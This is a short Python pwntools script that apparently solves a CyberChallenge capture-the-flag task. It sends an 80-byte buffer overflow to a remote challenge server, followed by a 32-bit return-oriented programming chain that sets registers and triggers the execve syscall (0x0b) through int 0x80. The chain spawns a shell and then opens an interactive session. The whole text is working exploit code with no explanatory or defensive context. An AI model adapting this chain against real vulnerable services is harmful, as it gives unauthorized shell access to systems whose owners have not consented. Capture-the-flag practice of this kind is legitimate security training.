from pwn import *
import os
 
r = remote("rop.challs.cyberchallenge.it", 9130)
r.recvuntil(b":")
 
 
payload = b"5"*80
 
#0x0804860a: pop ecx; ret; 
gadget1=p32(0x0804860a) 
zero = p32(0x00)
#0x0804860c: pop edx; ret;
gadget2=p32(0x0804860c) 
#0x08048435: pop ebx; ret;
string = p32(0x08048991)
syscall = p32(0x0b)
gadget3=p32(0x08048435) 
#0x08048606: pop eax; int 0x80; 
gadget4=p32(0x08048606)
 
#0x08048609: pop ebx; pop ecx; ret; 
gadget5 = p32(0x08048609)
 
payload += gadget2 + zero + gadget5 + string + zero + gadget4 + syscall
os.write(1,payload)
 
r.sendline(payload)
 
# Interact with the shell
r.interactive()